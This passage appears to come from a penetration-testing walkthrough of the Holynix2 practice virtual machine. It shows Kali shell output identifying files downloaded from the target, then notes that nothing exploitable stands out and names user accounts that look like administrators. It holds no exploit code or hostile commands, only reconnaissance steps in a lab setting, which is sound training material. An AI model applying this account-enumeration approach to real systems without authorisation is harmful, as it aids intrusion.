+  -rw-r--r-- 1 hacker hacker    1256 Jun  7 10:23 resume.txt
+  -rw-r--r-- 1 hacker hacker     108 Jun  7 10:23 Shopping%20List.txt
+  -rw-r--r-- 1 hacker hacker   40724 Jun  7 10:23 simplicity.jpg
+  -rw-r--r-- 1 hacker hacker 1364522 Jun  7 10:23 wrar393.exe
+  -rw-r--r-- 1 hacker hacker  339122 Jun  7 10:23 wu-ftpd-2.6.0.tar.gz
+  hacker@kali:~/pentest/holynix2/files$ file -k downloads/*
+  downloads/103670-pink_floyd_617_409.jpg: JPEG image data, JFIF standard 1.02
+  downloads/3some.jpg:                     JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85"
+  downloads/family-photo-2005-10.jpg:      JPEG image data, EXIF standard
+  downloads/girlscouts.jpg:                JPEG image data, JFIF standard 1.00, comment: "LEAD Technologies Inc. V1.01"
+  downloads/Hitler%20sings.wmv:            Microsoft ASF
+  downloads/invisibleman.jpg:              JPEG image data, JFIF standard 1.01
+  downloads/lighttpd-1.4.17.tar.gz:        gzip compressed data, from Unix, last modified: Tue Aug 28 17:41:33 2007, max compression
+  downloads/mac-users.jpg:                 JPEG image data, JFIF standard 1.02
+  downloads/mans%20dream%20remote.jpg:     JPEG image data, JFIF standard 1.01, comment: "Software: Microsoft Office"
+  downloads/manson.mp3:                    Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 320 kbps, 44.1 kHz, JntStereo
+  downloads/New%20Image1.jpg:              JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 95"
+  downloads/peercast.1212.tgz:             gzip compressed data, from Unix, last modified: Fri May 27 01:49:44 2005
+  downloads/phase10_win32_0.1.zip:         Zip archive data, at least v2.0 to extract
+  downloads/pinkdance.jpg:                 JPEG image data, JFIF standard 1.02
+  downloads/prime.jpg:                     JPEG image data, JFIF standard 1.01, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90"
+  downloads/resume.txt:                    ASCII text
+  downloads/Shopping%20List.txt:           ASCII text
+  downloads/simplicity.jpg:                JPEG image data, JFIF standard 1.01
+  downloads/wrar393.exe:                   PE32 executable (GUI) Intel 80386, for MS Windows, RAR self-extracting archive
+  downloads/wu-ftpd-2.6.0.tar.gz:          gzip compressed data, from Unix, last modified: Sat Oct 16 17:54:51 1999
+
+Once you've downloaded all the files you can switch DNS name resolution back. A quick peek at the downloaded files didn't show any obvious exploit material.
+
+After inspecting the downloaded files nothing of immediate consequence stands out. The :file:`resume.txt` flagged user ddonnovan as a potential administrative user along with lwestre for the ".gz" files and rcropper for :file:`phase10_win32_0.1.zip`.
+
